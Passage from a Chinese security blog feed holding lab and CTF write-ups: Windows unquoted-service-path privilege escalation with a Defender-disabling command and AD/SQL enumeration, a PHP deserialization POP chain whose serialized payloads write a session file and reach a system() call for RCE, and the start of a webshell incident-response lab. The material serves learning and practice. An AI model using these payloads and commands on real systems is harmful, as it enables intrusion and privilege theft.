<p>存在一个漏洞程序<code>C:\Program Files\Vuln Service\VulnService.exe</code>还给了利用方法<code>Write-ServiceBinary -ServiceName &#39;VulnService&#39; -Path &lt;HijackPath&gt;</code>,搜查了一下，发现这是因为可执行文件路径包含空格导致的漏洞。<br><a href="https://htb.linuxsec.org/active-directory/privilege-escalation/unquoted-service-path">https://htb.linuxsec.org/active-directory/privilege-escalation/unquoted-service-path</a><br><img src="https://ooo.0x0.ooo/2024/07/22/ORP8aG.png" alt="ORP8aG.png" loading="lazy"><br>利用一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Write-ServiceBinary <span class="token parameter variable">-ServiceName</span> VulnService <span class="token parameter variable">-UserName</span> <span class="token string">"offensive<span class="token entity" title="\a">\a</span>lice"</span> <span class="token parameter variable">-Password</span> 123qwE<span class="token operator">!</span>

ServiceName ServicePath Command
----------- ----------- -------
VulnService service.exe net localgroup Administrators offensive<span class="token punctuation">\</span>alice /add


PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> <span class="token function">cp</span> .<span class="token punctuation">\</span>service.exe <span class="token string">"C:\Program Files\Vuln Service\VulnService.exe"</span>
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span></code></pre>
<p>重启看一下权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token operator">></span>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
offensive<span class="token punctuation">\</span>Alice
offensive<span class="token punctuation">\</span>Domain Admins
The <span class="token builtin class-name">command</span> completed successfully.</code></pre>
<p>已经成功到administrators用户组了。</p>
<h2 id="域枚举"><a href="#域枚举" class="headerlink" title="域枚举"></a>域枚举</h2><p>先关闭windows自带的defender实时扫描，用管理员身份运行powershell,然后执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> Set-MpPreference <span class="token parameter variable">-disablerealtimeMonitoring</span> <span class="token variable">$true</span></code></pre>
<p>使用powerview进行域枚举<br>获取域信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Import-Module .<span class="token punctuation">\</span>powerview.ps1
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Get-NetDomain


Forest                  <span class="token builtin class-name">:</span> offensive.local
DomainControllers       <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>dc.offensive.local<span class="token punctuation">&#125;</span>
Children                <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
DomainMode              <span class="token builtin class-name">:</span> Windows2012R2Domain
DomainModeLevel         <span class="token builtin class-name">:</span> <span class="token number">6</span>
Parent                  <span class="token builtin class-name">:</span>
PdcRoleOwner            <span class="token builtin class-name">:</span> dc.offensive.local
RidRoleOwner            <span class="token builtin class-name">:</span> dc.offensive.local
InfrastructureRoleOwner <span class="token builtin class-name">:</span> dc.offensive.local
Name                    <span class="token builtin class-name">:</span> offensive.local</code></pre>
<p>获取域控</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Get-NetDomainController


Forest                     <span class="token builtin class-name">:</span> offensive.local
CurrentTime                <span class="token builtin class-name">:</span> <span class="token number">7</span>/22/2024 <span class="token number">1</span>:20:00 AM
HighestCommittedUsn        <span class="token builtin class-name">:</span> <span class="token number">69682</span>
OSVersion                  <span class="token builtin class-name">:</span> Windows Server <span class="token number">2016</span> Datacenter Evaluation
Roles                      <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>SchemaRole, NamingRole, PdcRole, RidRole<span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span>
Domain                     <span class="token builtin class-name">:</span> offensive.local
IPAddress                  <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.159.200
SiteName                   <span class="token builtin class-name">:</span> Default-First-Site-Name
SyncFromAllServersCallback <span class="token builtin class-name">:</span>
InboundConnections         <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
OutboundConnections        <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
Name                       <span class="token builtin class-name">:</span> dc.offensive.local
Partitions                 <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local, <span class="token assign-left variable">CN</span><span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local,
                             <span class="token assign-left variable">CN</span><span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local,
                             <span class="token assign-left variable">DC</span><span class="token operator">=</span>DomainDnsZones,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local<span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span></code></pre>
<p>获取域成员信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Get-NetUser <span class="token operator">|</span> <span class="token keyword">select</span> name

name
----
Administrator
Guest
DefaultAccount
krbtgt
Alice
dbuser1
dbadmin</code></pre>
<p>看一下dbadmin的组</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Get-NetGroup <span class="token parameter variable">-UserName</span> dbadmin


grouptype              <span class="token builtin class-name">:</span> DOMAIN_LOCAL_SCOPE, SECURITY
iscriticalsystemobject <span class="token builtin class-name">:</span> True
samaccounttype         <span class="token builtin class-name">:</span> ALIAS_OBJECT
samaccountname         <span class="token builtin class-name">:</span> Denied RODC Password Replication Group
whenchanged            <span class="token builtin class-name">:</span> <span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM
objectsid              <span class="token builtin class-name">:</span> S-1-5-21-1187620287-4058297830-2395299116-572
objectclass            <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>top, group<span class="token punctuation">&#125;</span>
cn                     <span class="token builtin class-name">:</span> Denied RODC Password Replication Group
usnchanged             <span class="token builtin class-name">:</span> <span class="token number">12433</span>
dscorepropagationdata  <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM, <span class="token number">1</span>/1/1601 <span class="token number">12</span>:00:01 AM<span class="token punctuation">&#125;</span>
name                   <span class="token builtin class-name">:</span> Denied RODC Password Replication Group
description            <span class="token builtin class-name">:</span> Members <span class="token keyword">in</span> this group cannot have their passwords replicated to any read-only domain
                         controllers <span class="token keyword">in</span> the domain
distinguishedname      <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local
member                 <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>CN<span class="token operator">=</span>Read-only Domain Controllers,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local, <span class="token assign-left variable">CN</span><span class="token operator">=</span>Group Policy Creator
                         Owners,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local, <span class="token assign-left variable">CN</span><span class="token operator">=</span>Domain Admins,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local,
                         <span class="token assign-left variable">CN</span><span class="token operator">=</span>Cert Publishers,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local<span class="token punctuation">..</span>.<span class="token punctuation">&#125;</span>
usncreated             <span class="token builtin class-name">:</span> <span class="token number">12405</span>
whencreated            <span class="token builtin class-name">:</span> <span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM
instancetype           <span class="token builtin class-name">:</span> <span class="token number">4</span>
objectguid             <span class="token builtin class-name">:</span> 503b1cf0-b495-4546-b51d-e783da98ae41
objectcategory         <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Group,CN<span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local

grouptype              <span class="token builtin class-name">:</span> GLOBAL_SCOPE, SECURITY
admincount             <span class="token builtin class-name">:</span> <span class="token number">1</span>
iscriticalsystemobject <span class="token builtin class-name">:</span> True
samaccounttype         <span class="token builtin class-name">:</span> GROUP_OBJECT
samaccountname         <span class="token builtin class-name">:</span> Domain Admins
whenchanged            <span class="token builtin class-name">:</span> <span class="token number">8</span>/18/2019 <span class="token number">11</span>:50:41 AM
objectsid              <span class="token builtin class-name">:</span> S-1-5-21-1187620287-4058297830-2395299116-512
objectclass            <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>top, group<span class="token punctuation">&#125;</span>
cn                     <span class="token builtin class-name">:</span> Domain Admins
usnchanged             <span class="token builtin class-name">:</span> <span class="token number">12783</span>
dscorepropagationdata  <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">8</span>/18/2019 <span class="token number">11</span>:50:41 AM, <span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM, <span class="token number">1</span>/1/1601 <span class="token number">12</span>:04:16 AM<span class="token punctuation">&#125;</span>
memberof               <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>CN<span class="token operator">=</span>Denied RODC Password Replication Group,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local,
                         <span class="token assign-left variable">CN</span><span class="token operator">=</span>Administrators,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local<span class="token punctuation">&#125;</span>
description            <span class="token builtin class-name">:</span> Designated administrators of the domain
distinguishedname      <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Domain Admins,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local
name                   <span class="token builtin class-name">:</span> Domain Admins
member                 <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>CN<span class="token operator">=</span>dbadmin,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local, <span class="token assign-left variable">CN</span><span class="token operator">=</span>Administrator,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local<span class="token punctuation">&#125;</span>
usncreated             <span class="token builtin class-name">:</span> <span class="token number">12345</span>
whencreated            <span class="token builtin class-name">:</span> <span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM
instancetype           <span class="token builtin class-name">:</span> <span class="token number">4</span>
objectguid             <span class="token builtin class-name">:</span> 2d8c47fa-daab-4c76-acb2-70a5b313289e
objectcategory         <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Group,CN<span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local

usncreated             <span class="token builtin class-name">:</span> <span class="token number">12348</span>
grouptype              <span class="token builtin class-name">:</span> GLOBAL_SCOPE, SECURITY
samaccounttype         <span class="token builtin class-name">:</span> GROUP_OBJECT
samaccountname         <span class="token builtin class-name">:</span> Domain Users
whenchanged            <span class="token builtin class-name">:</span> <span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM
objectsid              <span class="token builtin class-name">:</span> S-1-5-21-1187620287-4058297830-2395299116-513
objectclass            <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>top, group<span class="token punctuation">&#125;</span>
cn                     <span class="token builtin class-name">:</span> Domain Users
usnchanged             <span class="token builtin class-name">:</span> <span class="token number">12350</span>
dscorepropagationdata  <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM, <span class="token number">1</span>/1/1601 <span class="token number">12</span>:00:01 AM<span class="token punctuation">&#125;</span>
memberof               <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Users,CN<span class="token operator">=</span>Builtin,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local
iscriticalsystemobject <span class="token builtin class-name">:</span> True
description            <span class="token builtin class-name">:</span> All domain <span class="token function">users</span>
distinguishedname      <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Domain Users,CN<span class="token operator">=</span>Users,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local
name                   <span class="token builtin class-name">:</span> Domain Users
whencreated            <span class="token builtin class-name">:</span> <span class="token number">8</span>/18/2019 <span class="token number">11</span>:35:31 AM
instancetype           <span class="token builtin class-name">:</span> <span class="token number">4</span>
objectguid             <span class="token builtin class-name">:</span> de254972-257e-4c5e-a16f-b0e0836b2517
objectcategory         <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>Group,CN<span class="token operator">=</span>Schema,CN<span class="token operator">=</span>Configuration,DC<span class="token operator">=</span>offensive,DC<span class="token operator">=</span>local</code></pre>
<p>发现它有域管的权限</p>
<h2 id="sql服务信息收集"><a href="#sql服务信息收集" class="headerlink" title="sql服务信息收集"></a>sql服务信息收集</h2><p>使用<code>PowerUpSQL</code>进行信息收集<br>查询一下sql实例</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token punctuation">\</span>PowerUpSQL<span class="token operator">></span>  Get-SQLInstanceDomain <span class="token operator">|</span> Get-SQLConnectionTest

ComputerName                   Instance                                  Status
------------                   --------                                  ------
SQL1.offensive.local           SQL1.offensive.local,1433                 Not Accessible
SQL1.offensive.local           SQL1.offensive.local<span class="token punctuation">\</span>SQLEXPRESS           Not Accessible
Offensive-SQL1.offensive.local Offensive-SQL1.offensive.local,1433       Not Accessible
Offensive-SQL1.offensive.local Offensive-SQL1.offensive.local<span class="token punctuation">\</span>SQLEXPRESS Not Accessible
Offensive-SQL1                 Offensive-SQL1,1433                       Not Accessible</code></pre>
<p>为什么都不能access</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
        <tag>Offensive</tag>
      </tags>
  </entry>
  <entry>
    <title>帕鲁杯my love复现</title>
    <url>/posts/4666d2e/</url>
    <content><![CDATA[<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">-></span><span class="token function">love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">b</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"no!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">xk</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mylove</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\.|\.php/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">man</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件名不能有."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">man</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">woman</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">end</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/N$/"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$tmp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'your are good!'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ok!'</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/04/28/OpEvHI.png" alt="OpEvHI.png" loading="lazy"><br><code>$$tmp[&#39;name&#39;]==&#39;your are good!&#39;</code>这步满足就能执行shell，其中tmp是可控变量，可以利用_SESSION包含session文件<br>所以主要问题是写入session，需要里面满足<code>name</code>变量的值是<code>your are good!</code><br>session默认是按照php的序列化方式，那么先生成一个base64编码过的session方便写入</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'your are good!'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">session_encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7</span></span></code></pre>
<p>然后利用file_put_contents写入session，根据phpinfo知道session保存的地址<code>/var/lib/php/session</code><br><img src="https://ooo.0x0.ooo/2024/04/28/OpEmzF.png" alt="OpEmzF.png" loading="lazy"><br>写入session 这里的链子与前面的R23类似，并且不需要绕过R:2 R:3所以直接写就行了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">b</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">xk</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">end</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">-></span><span class="token property">man</span><span class="token operator">=</span><span class="token string single-quoted-string">'/var/lib/php/session/sess_1'</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">-></span><span class="token property">woman</span><span class="token operator">=</span><span class="token string single-quoted-string">'bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7'</span><span class="token punctuation">;</span>

<span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O:1:"b":3:&#123;s:1:"b";N;s:1:"c";R:2;s:1:"a";O:1:"a":1:&#123;s:1:"b";O:2:"xk":2:&#123;s:3:"man";s:27:"/var/lib/php/session/sess_1";s:5:"woman";s:36:"bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7";&#125;&#125;&#125;</span></span></code></pre>
<p>先提交一下pop将session写入<br>然后构造启用session的链，用session_start函数启用session</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">b</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">xk</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">end</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">-></span><span class="token property">func</span><span class="token operator">=</span><span class="token string single-quoted-string">'session_start'</span><span class="token punctuation">;</span>

<span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O:1:"b":3:&#123;s:1:"b";N;s:1:"c";R:2;s:1:"a";O:1:"a":1:&#123;s:1:"b";O:3:"end":1:&#123;s:4:"func";s:13:"session_start";&#125;&#125;&#125;</span></span></code></pre>
<p>然后加上test参数和shell进行rce,在请求包里面加上cookie<br><img src="https://ooo.0x0.ooo/2024/04/28/OpEpJ6.png" alt="OpEpJ6.png" loading="lazy"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title>应急靶场-Linux入侵排查</title>
    <url>/posts/efc85f7f/</url>
    <content><![CDATA[<p>账号：root 密码：linuxruqin</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@IP
<span class="token number">1</span>.web目录存在木马，请找到木马的密码提交
<span class="token number">2</span>.服务器疑似存在不死马，请找到不死马的密码提交
<span class="token number">3</span>.不死马是通过哪个文件生成的，请提交文件名
<span class="token number">4</span>.黑客留下了木马文件，请找出黑客的服务器ip提交
<span class="token number">5</span>.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</code></pre>
<h2 id="web目录存在木马，请找到木马的密码提交"><a href="#web目录存在木马，请找到木马的密码提交" class="headerlink" title="web目录存在木马，请找到木马的密码提交"></a>web目录存在木马，请找到木马的密码提交</h2><p>把html打包下来用d盾查一下<br><img src="https://ooo.0x0.ooo/2024/06/13/OJu1pq.png" alt="OJu1pq.png" loading="lazy"><br>打开看看哪个是的</p>
<pre class="language-php" data-language="php"><code class="language-php">//.shell.php
